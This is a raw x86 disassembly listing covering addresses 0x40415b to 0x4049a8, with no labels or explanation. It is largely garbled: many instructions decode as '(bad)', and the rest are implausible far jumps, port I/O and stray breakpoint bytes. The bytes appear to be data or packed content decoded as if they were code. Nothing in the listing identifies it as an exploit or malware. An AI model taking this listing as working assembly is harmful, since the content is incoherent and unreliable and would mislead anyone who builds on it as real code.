  40415b:	xchg   ebp,eax
  40415c:	fcmovne st,st(4)
  40415e:	xchg   edx,eax
  40415f:	call   eax
  404161:	inc    DWORD PTR [ebx-0x33d00e]
  404167:	test   BYTE PTR [ebx+0x284a005a],al
  40416d:	add    BYTE PTR [esi-0x1],dl
  404170:	inc    edi
  404171:	add    BYTE PTR [eax],al
  404173:	jno    0x404179
  404175:	(bad)  
  404176:	push   ebx
  404178:	(bad)  
  404179:	in     al,dx
  40417a:	sbb    DWORD PTR [ebp-0x59ff58],0x8
  404181:	(bad)  
  404182:	jmp    DWORD PTR [edx-0x22]
  404185:	int3   
  404186:	jmp    FWORD PTR [edi-0x6d00ab7d]
  40418c:	aad    0x0
  40418e:	mov    edx,0x8383fa00
  404193:	add    eax,0x81ff8322
  404198:	add    BYTE PTR [edi-0x16db01],ah
  40419e:	xlat   BYTE PTR ds:[ebx]
  40419f:	jmp    FWORD PTR [eax-0x35f2ff01]
  4041a5:	mov    edi,edi
  4041a7:	pop    ss
  4041a8:	inc    ebx
  4041aa:	add    BYTE PTR [esi],ch
  4041ac:	ud0    edi,esp
  4041af:	xor    DWORD PTR [ebx+0x6464ffff],0xffffff83
  4041b6:	jmp    DWORD PTR [edi]
  4041b8:	jmp    DWORD PTR [esi-0x768fd900]
  4041be:	xchg   ebp,eax
  4041bf:	add    BYTE PTR [edx-0x2ec6ff01],dl
  4041c5:	inc    DWORD PTR [eax]
  4041c7:	fwait
  4041c8:	call   DWORD PTR [ebx]
  4041ca:	int3   
  4041cb:	bound  ebp,QWORD PTR [eax]
  4041cd:	jmp    FWORD PTR [ecx]
  4041cf:	add    BYTE PTR [edx],ch
  4041d1:	add    ah,cl
  4041d3:	stc    
  4041d4:	xchg   ebx,eax
  4041d5:	(bad)  
  4041d6:	jmp    FWORD PTR [esi]
  4041d8:	add    BYTE PTR [edx+0x0],al
  4041db:	push   ss
  4041dc:	inc    esi
  4041dd:	add    BYTE PTR [ecx-0x34],cl
  4041e0:	inc    ebp
  4041e1:	(bad)  
  4041e2:	jmp    FWORD PTR ds:0x1cfffff2
  4041e8:	jmp    FWORD PTR [edi-0xaed01]
  4041ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041ef:	int3   
  4041f0:	cdq    
  4041f1:	mov    DWORD PTR [ecx-0x76008426],ecx
  4041f7:	xor    edi,edi
  4041f9:	pop    eax
  4041fa:	add    BYTE PTR [ebx+0x17],cl
  4041fd:	add    BYTE PTR [ebp-0x7d],cl
  404200:	std    
  404201:	add    BYTE PTR [ecx+0x5f54],cl
  404207:	aam    0xcc
  404209:	int3   
  40420a:	add    BYTE PTR [edi-0x7c2d00c3],ch
  404210:	lods   eax,DWORD PTR ds:[esi]
  404211:	add    BYTE PTR [ebx-0x7c7684],al
  404217:	jge    0x404219
  404219:	pop    edi
  40421a:	sub    DWORD PTR [edi-0x33b2ff8f],0x31
  404221:	cmp    edi,0x5d
  404224:	mov    dl,0x0
  404226:	inc    DWORD PTR [edx+0x75cc8a83]
  40422c:	in     al,0xff
  40422e:	add    DWORD PTR [eax],0x9300ff37
  404234:	idiv   edi
  404236:	and    eax,0x0
  404239:	test   al,0xff
  40423b:	dec    edx
  40423c:	in     eax,dx
  40423d:	add    BYTE PTR [ecx+0x0],ch
  404240:	xlat   BYTE PTR ds:[ebx]
  404241:	add    ah,cl
  404243:	cld    
  404244:	and    DWORD PTR [eax],eax
  404246:	inc    DWORD PTR [edi-0x800b801]
  40424c:	jmp    0xe70c7351
  404251:	inc    DWORD PTR [ebx-0x76760ace]
  404257:	jp     0x404258
  404259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40425a:	add    BYTE PTR [ebx],bh
  40425c:	jns    0x4041e1
  40425e:	mov    BYTE PTR [eax],al
  404260:	inc    esp
  404261:	inc    DWORD PTR [eax]
  404263:	or     ah,BYTE PTR [ebx-0x10034]
  404269:	adc    al,0x0
  40426b:	aad    0x52
  40426d:	mov    DWORD PTR [ebx-0xec34],esi
  404273:	xchg   ebp,eax
  404274:	dec    esp
  404275:	add    BYTE PTR [ebx+0x2cff7f],al
  40427b:	stc    
  40427c:	scas   eax,DWORD PTR es:[edi]
  40427d:	add    BYTE PTR [edi],bh
  40427f:	add    cl,al
  404281:	inc    DWORD PTR [eax]
  404283:	xor    al,0x55
  404285:	add    bh,bh
  404287:	test   BYTE PTR [eax],0x80
  40428a:	int3   
  40428b:	mov    dh,bl
  40428d:	int3   
  40428e:	jle    0x404290
  404290:	add    al,BYTE PTR [ebx-0x7c05b100]
  404296:	int3   
  404297:	push   ss
  404298:	add    BYTE PTR [ecx-0x77],ah
  40429b:	jno    0x4042a7
  40429d:	int3   
  40429e:	mov    edi,0x83ff8ccc
  4042a3:	jne    0x404276
  4042a5:	(bad)  
  4042a6:	push   esi
  4042a8:	add    BYTE PTR [edx-0x979c01],ch
  4042ae:	call   0x9829:0xff00bf83
  4042b5:	add    bh,bh
  4042b7:	mov    bh,0x0
  4042b9:	mov    eax,DWORD PTR [ebx+0x100023c3]
  4042bf:	inc    DWORD PTR [eax+0x3ad2ffff]
  4042c5:	mov    edi,edi
  4042c7:	pop    eax
  4042c8:	jmp    FWORD PTR [edx-0x1]
  4042cb:	idiv   ebx
  4042cd:	push   DWORD PTR [ebx+0xff59cc]
  4042d3:	mov    cl,0xdb
  4042d5:	inc    DWORD PTR [eax]
  4042d7:	rol    BYTE PTR [eax],cl
  4042d9:	(bad)  
  4042da:	inc    DWORD PTR [edi]
  4042dc:	mov    ah,0xff
  4042de:	add    DWORD PTR [ebx+0x4dff00aa],eax
  4042e4:	adc    al,BYTE PTR [eax]
  4042e6:	(bad)  
  4042e7:	jge    0x4042e8
  4042e9:	push   edi
  4042ea:	add    BYTE PTR [esi+0xe7cc68],ch
  4042f0:	sar    edi,0xff
  4042f3:	(bad)  
  4042f4:	inc    ebx
  4042f5:	(bad)  
  4042f6:	jmp    DWORD PTR [eax-0x7d]
  4042f9:	add    al,0xff
  4042fb:	jg     0x40428e
  4042fd:	add    BYTE PTR [edi],cl
  4042ff:	inc    DWORD PTR [ebx-0x1]
  404302:	push   DWORD PTR [edx-0x5700ff53]
  404308:	jmp    DWORD PTR [eax+0x0]
  40430b:	mov    eax,0x3eff2d
  404310:	aad    0x89
  404312:	adc    eax,0xffffffaf
  404315:	dec    DWORD PTR [ecx+0x77ffef]
  40431b:	fidivr DWORD PTR ds:0x20ccf8cc
  404321:	cmp    edi,0x6
  404324:	fild   WORD PTR [ebx+0x47ff8083]
  40432a:	cmp    DWORD PTR [edx-0xbe007b],0x3a
  404331:	add    bh,bh
  404333:	icebp  
  404334:	mov    ch,0x0
  404336:	(bad)  
  404337:	(bad)  
  404338:	call   DWORD PTR [ebp+0xe74e00]
  40433e:	xchg   esi,eax
  40433f:	and    edx,0xffffff83
  404342:	mov    DWORD PTR [eax+0x718383cf],edi
  404348:	add    BYTE PTR [esi-0x34],ah
  40434b:	add    ebp,DWORD PTR [esi]
  40434d:	jmp    FWORD PTR [edx]
  40434f:	jmp    FWORD PTR ds:0xc338383
  404355:	add    bh,bh
  404357:	cmp    bh,0x4
  40435a:	call   ebp
  40435c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40435d:	add    BYTE PTR [edi],cl
  40435f:	mov    DWORD PTR [esi],edx
  404361:	inc    DWORD PTR [eax]
  404363:	cmp    bh,BYTE PTR [ecx-0x7d]
  404366:	jmp    FWORD PTR [ecx-0x1]
  404369:	xchg   ecx,eax
  40436a:	add    BYTE PTR [esi+0x18],al
  40436d:	(bad)  
  40436e:	fadd   DWORD PTR [eax]
  404370:	cdq    
  404371:	add    BYTE PTR [eax],al
  404373:	cwde   
  404374:	cmp    bh,0xff
  404377:	pop    ss
  404378:	mov    DWORD PTR [ebx+eax*4-0x5b],ecx
  40437c:	xchg   ecx,eax
  40437d:	add    BYTE PTR [edx-0x7d],al
  404380:	dec    edi
  404381:	inc    DWORD PTR [ebx-0x7c00d11c]
  404387:	xchg   edx,eax
  404388:	jmp    DWORD PTR [esi-0x34]
  40438b:	xchg   ebx,eax
  40438c:	dec    eax
  40438d:	and    DWORD PTR [ecx],0x0
  404390:	xor    al,0x83
  404392:	int3   
  404393:	jmp    0x8000:0xe7ff00b5
  40439a:	add    BYTE PTR [esi-0xecffe1],dl
  4043a0:	sbb    al,0x89
  4043a2:	(bad)  
  4043a3:	mov    edx,0x3a830094
  4043a8:	add    ebx,0x0
  4043ab:	add    al,0xc2
  4043ad:	(bad)  
  4043ae:	fld    QWORD PTR [eax]
  4043b0:	cmp    eax,DWORD PTR [ebx-0xd82c77]
  4043b6:	int3   
  4043b7:	int    0xff
  4043b9:	lds    eax,FWORD PTR [ebx-0x57688c1]
  4043bf:	add    BYTE PTR [ebx],ah
  4043c1:	inc    DWORD PTR [ebx+0x35eb]
  4043c7:	inc    edx
  4043c8:	dec    DWORD PTR [edi+edi*8]
  4043cb:	repnz mov es,WORD PTR [ebx+0xc60033]
  4043d2:	sub    DWORD PTR [ecx],0x57
  4043d5:	add    BYTE PTR [eax],al
  4043d7:	retf   0x3fff
  4043da:	(bad)  
  4043db:	cmp    ch,al
  4043dd:	dec    edx
  4043df:	call   FWORD PTR [eax]
  4043e1:	mov    edi,edi
  4043e3:	dec    ebx
  4043e4:	pop    eax
  4043e5:	add    BYTE PTR [eax],al
  4043e7:	xchg   edi,eax
  4043e8:	dec    DWORD PTR [ebx+0x0]
  4043eb:	test   BYTE PTR [ebx-0x1],ah
  4043ee:	dec    edx
  4043ef:	adc    edx,0xffffffcc
  4043f2:	push   DWORD PTR [ecx+ecx*4-0x7d]
  4043f6:	int3   
  4043f7:	add    BYTE PTR [eax],0xa
  4043fa:	int3   
  4043fb:	leave  
  4043fc:	dec    ebp
  4043fd:	add    BYTE PTR [eax+0xccefff],bh
  404403:	sub    BYTE PTR [esi],cl
  404405:	add    BYTE PTR [ecx-0xbf00d3],cl
  40440b:	mov    eax,ds:0xcc5700e7
  404410:	daa    
  404411:	(bad)  
  404412:	inc    DWORD PTR [ecx+0x48]
  404415:	add    BYTE PTR [eax],al
  404417:	inc    ebp
  404418:	add    BYTE PTR [edi+edi*8],dl
  40441b:	daa    
  40441c:	stos   DWORD PTR es:[edi],eax
  40441d:	dec    DWORD PTR [ebx-0x1]
  404420:	push   esi
  404421:	mov    DWORD PTR [eax],eax
  404423:	into   
  404424:	aad    0x89
  404426:	add    dh,al
  404428:	jmp    FWORD PTR [esi+0x867cff]
  40442e:	ins    BYTE PTR es:[edi],dx
  40442f:	add    BYTE PTR [ecx+0x90acc00],bl
  404435:	int3   
  404436:	add    BYTE PTR [ecx],bl
  404438:	add    BYTE PTR [edx-0x1],ah
  40443b:	jmp    0x404467
  40443d:	push   esp
  40443f:	jmp    FWORD PTR [edi]
  404441:	add    bh,bh
  404443:	xchg   edi,eax
  404444:	push   0xff7a0083
  404449:	or     BYTE PTR [eax],al
  40444b:	dec    ebp
  40444c:	(bad)  
  40444d:	inc    ebx
  40444f:	mov    DWORD PTR [eax+eax*1+0x0],edx
  404453:	xlat   BYTE PTR ds:[ebx]
  404454:	pop    esi
  404455:	int3   
  404456:	inc    edx
  404458:	add    DWORD PTR [edx-0x1],0x12
  40445c:	and    al,0xff
  40445e:	mov    dh,0x0
  404460:	pop    esp
  404461:	int3   
  404462:	add    DWORD PTR [ebx-0x19ff002e],0xffffff83
  404469:	or     eax,DWORD PTR [eax]
  40446b:	mov    di,di
  40446e:	or     edi,edi
  404470:	push   cs
  404471:	(bad)  
  404472:	push   ebp
  404474:	mov    dl,0xff
  404476:	dec    DWORD PTR [edi-0x4ffde7d]
  40447c:	mov    WORD PTR [eax],es
  40447e:	rol    BYTE PTR [eax],0x6d
  404481:	mov    DWORD PTR [eax],eax
  404483:	fiadd  DWORD PTR [ebx-0x1]
  404486:	add    BYTE PTR [esi-0x3dff0200],al
  40448c:	arpl   WORD PTR [ebx+0x6e89aa],ax
  404492:	inc    DWORD PTR [edi+ebx*1]
  404495:	cmp    edi,0xfffffff6
  404498:	add    BYTE PTR [ecx-0x7d],dl
  40449b:	push   ebp
  40449c:	(bad)  
  40449e:	ja     0x40449f
  4044a0:	pop    es
  4044a1:	add    bh,bh
  4044a3:	inc    esp
  4044a4:	das    
  4044a5:	add    DWORD PTR [eax],0x30
  4044a8:	add    BYTE PTR [ecx-0x957601],dl
  4044ae:	test   bh,bh
  4044b0:	idiv   bh
  4044b2:	push   DWORD PTR [ecx]
  4044b4:	pop    ss
  4044b5:	add    bh,bh
  4044b7:	call   0x303f66bb
  4044bc:	inc    esp
  4044bd:	jmp    edx
  4044bf:	add    BYTE PTR [ebx-0x7d],bl
  4044c2:	call   FWORD PTR [ecx+0x6000080]
  4044c8:	add    BYTE PTR [eax+0x0],bh
  4044cb:	mov    bl,0xc5
  4044cd:	inc    DWORD PTR [ebx-0x7cff417d]
  4044d3:	dec    bp
  4044d5:	(bad)  
  4044d6:	(bad)  
  4044d7:	inc    BYTE PTR [ebx+0x720ff7e]
  4044dd:	add    BYTE PTR [edi+0xfff5ff],bh
  4044e3:	iret   
  4044e4:	(bad)  
  4044e6:	adc    DWORD PTR [edi-0x7d],0x6
  4044ea:	jmp    DWORD PTR [edx+0x86ff08]
  4044f0:	sar    edi,cl
  4044f2:	add    BYTE PTR [ecx+eax*8],al
  4044f5:	inc    DWORD PTR [eax]
  4044f7:	xor    al,0x89
  4044f9:	adc    al,BYTE PTR [eax]
  4044fb:	mov    ebx,0x67ff63
  404500:	inc    eax
  404501:	dec    esp
  404503:	lahf   
  404504:	pop    ecx
  404505:	add    BYTE PTR [ebx-0xa90059],al
  40450b:	gs push ebx
  40450d:	sub    DWORD PTR [edi-0x77],0x78
  404511:	int3   
  404512:	jmp    FWORD PTR [eax]
  404514:	sbb    bh,bh
  404516:	push   DWORD PTR [esi-0x5d00cd77]
  40451c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40451d:	jmp    FWORD PTR [esi+0x894400]
  404523:	adc    BYTE PTR [edx-0x1],dl
  404526:	add    BYTE PTR [ecx-0x1],cl
  404529:	jle    0x40452b
  40452b:	inc    BYTE PTR [edi-0x1]
  40452e:	dec    ebx
  40452f:	call   FWORD PTR [eax+eax*1-0x623d34]
  404536:	inc    ebx
  404538:	call   DWORD PTR [edi-0x4d5300]
  40453e:	ja     0x4044c3
  404540:	in     al,0x0
  404542:	jmp    DWORD PTR [esi]
  404544:	cmp    eax,0x3accff
  404549:	fdivp  st(7),st
  40454b:	xor    DWORD PTR [edx+0x0],edx
  40454e:	xchg   ebx,eax
  40454f:	add    dh,ah
  404551:	int3   
  404552:	add    bl,cl
  404554:	cmp    edi,0x7ff64ff
  40455a:	jmp    FWORD PTR [edx-0x1f009c]
  404560:	daa    
  404561:	add    BYTE PTR [ebx+0x834f9e],al
  404567:	dec    ebp
  404568:	add    DWORD PTR [ebp+0x8539ff],0xffffffca
  40456f:	and    DWORD PTR [eax],0xffffffcc
  404572:	add    BYTE PTR [edi-0x38],bl
  404575:	inc    DWORD PTR [eax]
  404577:	ss int3 
  404579:	ja     0x4044fe
  40457b:	push   esp
  40457c:	repnz (bad) 
  40457e:	fmul   st,st(4)
  404580:	jl     0x404581
  404582:	(bad)  
  404583:	call   0x730d44e4
  404588:	add    BYTE PTR [eax+eax*1],cl
  40458b:	jmp    0xff71:0x895b
  404592:	add    BYTE PTR [esi-0x43],dh
  404595:	add    ah,cl
  404597:	out    0xff,eax
  404599:	test   eax,0xff74d0ff
  40459e:	inc    esi
  40459f:	add    bl,bh
  4045a1:	add    bh,bh
  4045a3:	and    al,0xa
  4045a5:	add    BYTE PTR [eax],al
  4045a7:	sub    edi,edi
  4045a9:	adc    eax,DWORD PTR [eax]
  4045ab:	lods   eax,DWORD PTR ds:[esi]
  4045ac:	or     esp,0x1e0059
  4045b2:	dec    DWORD PTR ds:0x1dff000a
  4045b8:	push   DWORD PTR [eax-0x9f2e01]
  4045be:	fild   DWORD PTR [eax]
  4045c0:	(bad)  
  4045c3:	sub    DWORD PTR [edi],0xffffff83
  4045c6:	sub    DWORD PTR [eax+eax*1+0x69],0xffffffff
  4045cb:	repnz push esi
  4045cd:	add    dl,ch
  4045cf:	(bad)  
  4045d0:	cmp    al,BYTE PTR [eax]
  4045d2:	call   DWORD PTR [ebp+0x70ffcc85]
  4045d8:	mov    DWORD PTR [ecx-0x77],eax
  4045db:	adc    DWORD PTR [esi],ecx
  4045dd:	push   esi
  4045df:	add    BYTE PTR [ecx],bl
  4045e1:	mov    DWORD PTR [ebx+0x3783],eax
  4045e7:	daa    
  4045e8:	add    edx,0xffffffff
  4045eb:	or     ebx,DWORD PTR [ebp+0x3bff45ff]
  4045f1:	(bad)  
  4045f2:	(bad)  
  4045f3:	jmp    0x404607
  4045f5:	dec    DWORD PTR [ecx-0x50ff97]
  4045fb:	into   
  4045fc:	push   esi
  4045fd:	add    BYTE PTR [ecx-0x1],bh
  404600:	jg     0x404601
  404602:	inc    eax
  404604:	push   cs
  404605:	(bad)  
  404606:	dec    eax
  404608:	jmp    esp
  40460a:	add    BYTE PTR [ebx+ecx*8-0x34],dh
  40460e:	sbb    edi,edi
  404610:	xor    edi,edi
  404612:	int3   
  404613:	cmp    bl,bl
  404615:	inc    DWORD PTR [eax]
  404617:	fiadd  DWORD PTR [eax]
  404619:	ja     0x40461b
  40461b:	popf   
  40461c:	adc    al,0xff
  40461e:	mov    ebx,0xffff1eff
  404623:	std    
  404624:	push   esp
  404625:	add    bh,bh
  404627:	mov    ds:0x68ff4bcc,eax
  40462c:	imul   eax,DWORD PTR [eax],0xffffffe6
  40462f:	inc    DWORD PTR [ecx-0x45220001]
  404635:	(bad)  
  404636:	push   DWORD PTR [ecx-0x1]
  404639:	add    DWORD PTR [eax],eax
  40463b:	or     al,0xa8
  40463d:	add    BYTE PTR [eax],bl
  40463f:	inc    eax
  404641:	add    ah,cl
  404643:	or     BYTE PTR [edi+edi*8-0x1],bh
  404647:	imul   edi,edi,0xffffffb1
  40464a:	mov    DWORD PTR [ebx],ecx
  40464c:	popa   
  40464d:	add    BYTE PTR [eax+eax*1-0x1b00004a],al
  404654:	ds int3 
  404656:	inc    DWORD PTR [edx+0x72009d00]
  40465c:	jl     0x40465e
  40465e:	mov    dl,0x0
  404660:	rol    DWORD PTR [ebx-0xbf6200],1
  404666:	dec    esp
  404668:	call   DWORD PTR [eax+0x42fbff]
  40466e:	sub    edi,edi
  404670:	pop    ebx
  404671:	(bad)  
  404672:	jmp    FWORD PTR [esi]
  404674:	mov    dl,0xff
  404676:	mov    DWORD PTR [edx-0xffc200],eax
  40467c:	push   edx
  40467d:	add    BYTE PTR [edi+edi*8+0x23],dl
  404681:	inc    DWORD PTR [eax]
  404683:	cmp    ch,BYTE PTR [edi-0x1]
  404686:	add    DWORD PTR [eax-0x59000901],0xffffff93
  40468d:	add    BYTE PTR [edx],cl
  40468f:	cmp    ebp,0xffffffcc
  404692:	add    bh,dh
  404694:	push   ss
  404695:	int3   
  404696:	call   FWORD PTR [ecx-0x34]
  404699:	ins    DWORD PTR es:[edi],dx
  40469a:	call   ecx
  40469c:	add    eax,DWORD PTR [ebx-0x180005]
  4046a2:	mov    DWORD PTR ds:0x8cccc87,edx
  4046a8:	adc    DWORD PTR [ebp+0x1b500],0x31
  4046af:	push   eax
  4046b1:	inc    DWORD PTR [ebx-0xff7b8e]
  4046b7:	sti    
  4046b8:	dec    edx
  4046ba:	mov    DWORD PTR [edi],edi
  4046bc:	mov    edi,?
  4046be:	call   0x401ac2
  4046c3:	mul    DWORD PTR [edi-0x7cc80077]
  4046c9:	jo     0x40464e
  4046cb:	cmp    edi,esp
  4046cd:	add    bh,bh
  4046cf:	add    BYTE PTR ds:0xae2cff83,al
  4046d5:	add    BYTE PTR [ebx+0x47ff6b],al
  4046db:	imul   ebp,DWORD PTR [edi+edi*8],0x83e1cc9f
  4046e2:	int3   
  4046e3:	fidivr WORD PTR [ebx]
  4046e5:	cmp    edi,0x19
  4046e8:	call   ecx
  4046ea:	int3   
  4046eb:	mov    gs,ebp
  4046ed:	add    BYTE PTR [esi-0x76fffa01],cl
  4046f3:	dec    ebx
  4046f4:	jp     0x4046f6
  4046f6:	push   esp
  4046f8:	int3   
  4046f9:	test   al,0xff
  4046fb:	xchg   DWORD PTR [ecx+0x7300dfff],edx
  404701:	(bad)  
  404702:	jmp    DWORD PTR [edi-0x3ff00c8]
  404708:	mov    DWORD PTR [ebx-0x22b201],esp
  40470e:	or     eax,0xffff77ff
  404713:	xchg   BYTE PTR [ecx-0x1],bh
  404716:	inc    DWORD PTR [ebp-0x1]
  404719:	int    0x0
  40471b:	idiv   DWORD PTR [ebx]
  40471d:	jmp    FWORD PTR [edi]
  40471f:	jmp    ebx
  404721:	add    BYTE PTR [eax],al
  404723:	or     DWORD PTR ds:0xff9d00ff,edi
  404729:	arpl   WORD PTR [eax],ax
  40472b:	retf   0xc1
  40472e:	mov    esp,0xff833189
  404733:	outs   dx,BYTE PTR ds:[esi]
  404734:	dec    eax
  404735:	dec    esp
  404737:	adc    DWORD PTR [ecx+0x407dffea],ecx
  40473d:	dec    DWORD PTR [edi+edi*8-0x1aff00bd]
  404744:	push   ebx
  404745:	cmp    edi,0xffffffe8
  404748:	dec    ebx
  40474a:	add    BYTE PTR [ecx-0xb0ff54],ah
  404750:	test   al,0x83
  404752:	add    BYTE PTR [edi+edi*4-0x14007d],bh
  404759:	jnp    0x404727
  40475b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40475c:	push   es
  40475d:	add    dh,ah
  40475f:	sbb    DWORD PTR [edi-0x1],0x0
  404763:	lock sar edi,0x0
  404767:	popf   
  404768:	add    BYTE PTR [ecx+0x0],bl
  40476b:	adc    eax,0xff7e8396
  404770:	inc    ecx
  404771:	add    BYTE PTR [eax],al
  404773:	push   edx
  404774:	imul   eax,DWORD PTR [eax],0xffffffff
  404777:	arpl   WORD PTR [eax],ax
  404779:	mov    ch,0xff
  40477b:	int    0xb
  40477d:	(bad)  
  40477e:	jmp    0x4145:0xff006200
  404785:	int3   
  404786:	push   DWORD PTR [ecx+0x4083a600]
  40478c:	push   edi
  40478d:	call   DWORD PTR [edi+0xff6aff]
  404793:	ret    
  404794:	cmp    ah,cl
  404796:	call   edx
  404798:	inc    DWORD PTR ds:0xffcf9983
  40479e:	inc    eax
  40479f:	mov    DWORD PTR [eax+0x5831ff00],edx
  4047a5:	dec    esp
  4047a7:	add    BYTE PTR [eax],0xed
  4047aa:	(bad)  
  4047ab:	fcom   QWORD PTR [esi-0x1]
  4047ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047af:	cmp    DWORD PTR [ebx-0x27bb007d],0xffffffff
  4047b6:	dec    DWORD PTR [ecx+0x7affaaff]
  4047bc:	jo     0x4047be
  4047be:	out    dx,al
  4047bf:	call   DWORD PTR [esi-0x34]
  4047c2:	add    BYTE PTR [ecx+0x34],dl
  4047c5:	mov    edi,edi
  4047c7:	mov    WORD PTR [eax],es
  4047c9:	xor    eax,0x7cb6ff
  4047ce:	jmp    0x40479c
  4047d0:	ud0    edi,edi
  4047d3:	sbb    al,0x5b
  4047d5:	add    bh,bh
  4047d7:	ins    BYTE PTR es:[edi],dx
  4047d8:	add    DWORD PTR [eax-0x1],0x65
  4047dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047dd:	(bad)  
  4047de:	std    
  4047df:	add    bl,al
  4047e1:	inc    DWORD PTR [eax]
  4047e3:	jmp    0x1600:0x72ffff67
  4047ea:	jmp    DWORD PTR [esi-0x1b]
  4047ed:	call   DWORD PTR [edi+0x8326cc]
  4047f3:	cmp    ebp,DWORD PTR [esi-0x1]
  4047f6:	inc    DWORD PTR [ebp+0x1100b4ff]
  4047fc:	fld    QWORD PTR [ebx-0x81ff0c]
  404802:	sub    ecx,0xffffff85
  404805:	inc    DWORD PTR [eax]
  404807:	lea    eax,[eax]
  404809:	mov    DWORD PTR [eax],0x18004bc6
  40480f:	(bad)  
  404810:	fadd   QWORD PTR [eax]
  404812:	push   ebx
  404814:	push   esi
  404815:	int3   
  404816:	add    BYTE PTR [eax+0x7bff56ff],bh
  40481c:	push   esi
  40481d:	add    BYTE PTR [esi-0xff6101],bl
  404823:	ret    
  404824:	jns    0x404826
  404826:	mov    DWORD PTR [eax],ecx
  404828:	dec    edx
  40482a:	call   FWORD PTR [esi-0x65]
  40482d:	int3   
  40482e:	into   
  40482f:	dec    DWORD PTR [ebx-0x1]
  404832:	(bad)  
  404833:	(bad)  
  404834:	imul   edi,edi,0xd8ff93ff
  40483a:	int3   
  40483b:	or     dl,BYTE PTR [ecx-0x1]
  40483e:	inc    DWORD PTR [eax]
  404840:	enter  0xff89,0xba
  404844:	repnz or DWORD PTR [ecx+0xcf83bb],0xffffffe8
  40484c:	pop    edi
  40484d:	(bad)  
  40484e:	(bad)  
  404850:	sbb    bh,bh
  404852:	int3   
  404853:	into   
  404854:	dec    ebp
  404855:	add    BYTE PTR [ebx-0xf3ff63],al
  40485b:	scas   eax,DWORD PTR es:[edi]
  40485c:	popa   
  40485d:	dec    DWORD PTR [eax+eax*1-0x3c0000ec]
  404864:	sar    edi,0x0
  404867:	out    dx,eax
  404868:	add    BYTE PTR [edi+edi*8+0x75002bb1],cl
  40486f:	int3   
  404870:	push   es
  404871:	add    bh,bh
  404873:	sub    edi,ebp
  404875:	add    bh,bh
  404877:	adc    al,0xcc
  404879:	call   FWORD PTR es:[ebx-0xa3ff33]
  404880:	jne    0x404805
  404882:	int3   
  404883:	(bad)  
  404884:	leave  
  404885:	dec    DWORD PTR [ecx-0x45ff8c]
  40488b:	test   DWORD PTR [eax+eax*1+0x4],edx
  40488f:	add    BYTE PTR [eax+0x5ccf00ff],cl
  404895:	(bad)  
  404896:	push   DWORD PTR [ecx+ecx*4-0x58]
  40489a:	add    BYTE PTR [ebp-0x7800d2],ah
  4048a0:	inc    eax
  4048a1:	(bad)  
  4048a2:	call   esi
  4048a4:	adc    al,BYTE PTR [eax]
  4048a6:	add    BYTE PTR [edx-0x1],ah
  4048a9:	pop    es
  4048aa:	int3   
  4048ab:	mov    ecx,0xccf1ff22
  4048b0:	(bad)  
  4048b1:	add    BYTE PTR [eax],al
  4048b3:	hlt    
  4048b4:	sbb    bh,bh
  4048b6:	jmp    FWORD PTR [ebx-0x5f7c0e00]
  4048bc:	jmp    0xffff:0x78387ff
  4048c3:	cmc    
  4048c4:	add    edi,edi
  4048c6:	jmp    FWORD PTR [edi]
  4048c8:	int3   
  4048c9:	xlat   BYTE PTR ds:[ebx]
  4048ca:	add    bh,bh
  4048cc:	xor    DWORD PTR [ebx-0x331200e3],eax
  4048d2:	add    BYTE PTR [ecx-0x6fffff71],bl
  4048d8:	add    BYTE PTR [ebx+0x0],cl
  4048db:	sbb    ch,bh
  4048dd:	(bad)  
  4048de:	jl     0x4048df
  4048e0:	add    BYTE PTR [eax],0xff
  4048e3:	test   al,0x6a
  4048e5:	add    BYTE PTR [ecx-0x33160083],cl
  4048eb:	add    BYTE PTR [edi+edi*8],0x97
  4048ef:	int3   
  4048f0:	loope  0x4048be
  4048f2:	int3   
  4048f3:	ds cmp bh,bh
  4048f6:	dec    esi
  4048f8:	(bad)  
  4048f9:	mov    eax,0xcc8c5e00
  4048fe:	push   ecx
  4048ff:	call   DWORD PTR [edx]
  404901:	cmp    edi,0xffffffd5
  404904:	mov    al,BYTE PTR [eax]
  404906:	add    ch,dh
  404908:	add    edi,0xffffffcc
  40490b:	retf   
  40490c:	mov    ecx,0x72ff39ff
  404911:	(bad)  
  404912:	call   DWORD PTR [eax]
  404914:	add    edi,edi
  404916:	jmp    FWORD PTR [esi-0x1]
  404919:	add    eax,0xff21ba00
  40491e:	aam    0xff
  404920:	addr16 cmp edi,0xffffffa3
  404924:	lea    eax,[eax]
  404926:	dec    DWORD PTR [esi+0x0]
  404929:	push   es
  40492a:	inc    esi
  40492c:	cmp    DWORD PTR ss:[edi+edi*8+0x3e],0xffffff89
  404932:	mov    DWORD PTR [ecx+0x7bffff68],ebp
  404938:	dec    ebp
  40493a:	add    dh,dh
  40493c:	jmp    0x4048c1
  40493e:	mov    ecx,0xffffe9cc
  404943:	inc    esp
  404944:	call   0x4948cc
  404949:	daa    
  40494a:	add    BYTE PTR [esi-0x7c220085],bh
  404950:	add    edi,edi
  404952:	add    BYTE PTR [esi],ah
  404954:	pusha  
  404955:	dec    esp
  404957:	(bad)  
  404959:	popf   
  40495a:	sub    DWORD PTR [eax+0x7f],0xffffffff
  40495e:	jle    0x40495f
  404960:	outs   dx,DWORD PTR ds:[esi]
  404961:	inc    DWORD PTR [ebx+0xff3722]
  404967:	pop    edi
  404968:	jmp    DWORD PTR [ebx+0x4a51ff]
  40496e:	mov    BYTE PTR [eax],al
  404970:	pop    edi
  404971:	add    bh,bh
  404973:	push   es
  404974:	and    edi,edi
  404976:	add    BYTE PTR [esi-0x3600477d],bh
  40497c:	aam    0x0
  40497e:	(bad)  
  404980:	add    BYTE PTR [bx+si],al
  404983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404984:	dec    eax
  404985:	(bad)  
  404986:	jmp    DWORD PTR [ebp-0xaff9e7d]
  40498c:	dec    edx
  40498d:	int3   
  40498e:	mov    eax,DWORD PTR [ebx-0xd00ffb5]
  404994:	fiadd  WORD PTR [ebx-0x5700c677]
  40499a:	jmp    FWORD PTR [ecx+esi*8+0x6effc3ff]
  4049a1:	mov    DWORD PTR [eax],eax
  4049a3:	clc    
  4049a4:	fild   DWORD PTR [eax]
  4049a6:	jmp    edi
  4049a8:	add    BYTE PTR [ecx],cl
